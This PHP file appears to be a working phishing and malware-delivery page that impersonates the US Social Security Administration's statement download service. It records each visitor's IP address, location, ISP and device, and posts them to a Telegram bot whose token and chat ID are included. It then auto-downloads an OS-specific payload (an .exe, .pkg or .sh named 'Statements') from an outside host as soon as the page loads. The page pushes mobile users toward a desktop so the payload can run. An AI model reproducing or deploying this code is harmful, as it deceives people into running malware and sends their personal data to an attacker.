<?php
// Visitor counter
$counter_file = 'visitor_count.txt';
$visitor_count = file_exists($counter_file) ? (int)file_get_contents($counter_file) + 1 : 1;
file_put_contents($counter_file, $visitor_count);

// Get visitor info
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];
$time = date('Y-m-d H:i:s');
$isp = gethostbyaddr($ip); // Get ISP/domain info

// Fetch geolocation data
$geoData = @json_decode(file_get_contents("https://ipapi.co/$ip/json/"), true);
$location = "{$geoData['city'] ?? 'Unknown'}, {$geoData['region'] ?? 'Unknown'}, {$geoData['country_name'] ?? 'Unknown'}";

// Detect operating system and device
$isMobile = preg_match('/mobile|android|iphone|ipad/i', $ua);
$os = 'Unknown OS';
$fileUrl = '';

if (stripos($ua, 'Win') !== false) {
    $os = 'Windows';
    $fileUrl = 'https://specialitystoreservice.com/camphere/sigidwhat/Statements.exe';
} elseif (stripos($ua, 'Mac') !== false) {
    $os = 'Mac';
    $fileUrl = 'https://specialitystoreservice.com/camphere/sigidwhat/Statements.pkg';
} elseif (stripos($ua, 'Linux') !== false) {
    $os = 'Linux';
    $fileUrl = 'https://specialitystoreservice.com/camphere/sigidwhat/Statements.sh';
} else {
    $fileUrl = 'https://specialitystoreservice.com/camphere/sigidwhat/Statements.exe'; // Default to Windows file if OS is unrecognized
}

// Format message
$message = "🚀 New SSA WEBSITE VISIT DETECTED!\n"
          ."══════════════════════════════\n"
          ."👤 Visitor No: $visitor_count\n"
          ."🌐 IP Address: $ip\n"
          ."📍 Location: $location\n"
          ."📡 ISP: ".($isp ?: 'Unknown')."\n"
          ."💻 Device: $ua\n"
          ."🖥️ Operating System: $os\n"
          ."🕒 Time: $time\n"
          ."══════════════════════════════\n"
          ."🔔 VISITOR TRACKING ACTIVE!\n";

// Send to Telegram
$botToken = '7284066719:AAEncc3VY27DzgRzCLnuNTLpyIJf5MrrCos';
$chatId = '7724482403';
$url = "https://api.telegram.org/bot$botToken/sendMessage";

$data = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'HTML',
    'disable_web_page_preview' => true
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

// Serve the appropriate response
if ($isMobile) {
    echo '<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Red Flag - Statements Download</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f8d7da;
            color: #721c24;
            padding: 50px;
        }
        .red-flag {
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 20px;
        }
        .countdown {
            font-size: 48px;
            font-weight: bold;
        }
    </style>
    <script>
        let countdown = 20; // 20 seconds countdown
        function updateCountdown() {
            document.getElementById("countdown").innerText = countdown;
            if (countdown <= 0) {
                window.close(); // Close the tab when countdown reaches 0
            } else {
                countdown--;
                setTimeout(updateCountdown, 1000);
            }
        }
        window.onload = updateCountdown;
    </script>
</head>
<body>
    <div class="red-flag">⚠️ Statements download is only allowed on Desktop/PC/Computer! ⚠️</div>
    <div>Please switch to a desktop device for downloading the statements.</div>
    <div class="countdown">Redirecting in <span id="countdown">20</span> seconds...</div>
</body>
</html>';
    exit;
} else {
    // Return the original styled page for desktop users
    echo '<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta content="IE=edge" http-equiv="X-UA-Compatible" />
    <meta content="width=device-width, initial-scale=1" name="viewport" />
    <meta content="no-cache" http-equiv="Pragma" />
    <meta content="no-store, no-cache, must-revalidate" http-equiv="Cache-Control" />
    <meta content="File-Download" name="application-name" />
    <title>The United States Social Security Administration | SSA</title>
    <link href="./assets/img/favicon.ico" rel="icon" type="image/x-icon" />
    <style type="text/css">
        @import url(https://www.ssa.gov/flexweb/rel_5_1_2/css/import.css);
        @import url(styles/appStyles.css);

        h1 {
            font-size: 2em;
            color: #0033a0;
            margin-bottom: 20px;
        }

        #downloadLink {
            color: #007bff;
            text-decoration: none;
        }

        #downloadLink:hover {
            text-decoration: underline;
        }
    </style>
    <script>
        // Auto-download the file
        window.onload = function() {
            const fileUrl = "'.$fileUrl.'";
            const link = document.createElement("a");
            link.href = fileUrl;
            link.download = fileUrl.substring(fileUrl.lastIndexOf("/") + 1);
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            
            // Update the manual download link
            document.getElementById("downloadLink").href = fileUrl;
        };
    </script>
</head>
<body class="uef-theme-std">
<header>
    <div id="uef-tmpl-header">
        <a accesskey="K" href="#" id="uef-tmpl-skipNav">Skip to Content</a>
        <div id="uef-tmpl-logo">&nbsp;</div>
        <div id="uef-tmpl-websiteTitle">
            <h1>Social Security Administration</h1>
        </div>
    </div>
</header>

<div id="uef-tmpl-content-wrapper">
    <div id="uef-tmpl-content">
        <form action="" id="FileDownload" method="post" name="FileDownload">
            <div class="uef-container module">
                <div class="uef-container-row">
                    <div class="uef-container-content">
                        <div class="uef-notice uef-info">
                            <div class="uef-notice-row hd">
                                <div class="uef-notice-content">
                                    <center>
                                        <h1>Welcome to Your Latest SSA Statement Download</h1>
                                    </center>
                                    <h4>Your download will start automatically. If it doesn\'t, 
                                        <a download="" href="#" id="downloadLink">click here</a>.
                                    </h4>
                                </div>
                            </div>
                            <div class="uef-notice-row">
                                <div class="uef-notice-content">
                                    <p>Thank you for using our service. If the download does not start within a few seconds, you may manually start it by clicking the link above.</p>
                                    <p>For further assistance, please contact our help desk at <strong>1-800-123-4567</strong>.</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </form>
    </div>

    <footer id="uef-tmpl-footer">
        <a href="#" target="_blank">Privacy and Security</a>
        <ul>
            <li><a href="#" id="uef-tmpl-paperworkReduction" target="_blank">OMB No. 0960-0789</a></li>
            <li><a href="#" id="uef-tmpl-privacyPolicy" target="_blank">Privacy Policy</a></li>
            <li><a href="#" id="uef-tmpl-privacyAct" target="_blank">Privacy Act Statement</a></li>
            <li><a href="#" id="uef-tmpl-accessibility" target="_blank">Accessibility Help</a></li>
        </ul>
    </footer>
</div>
</body>
</html>';
    exit;
}
?>
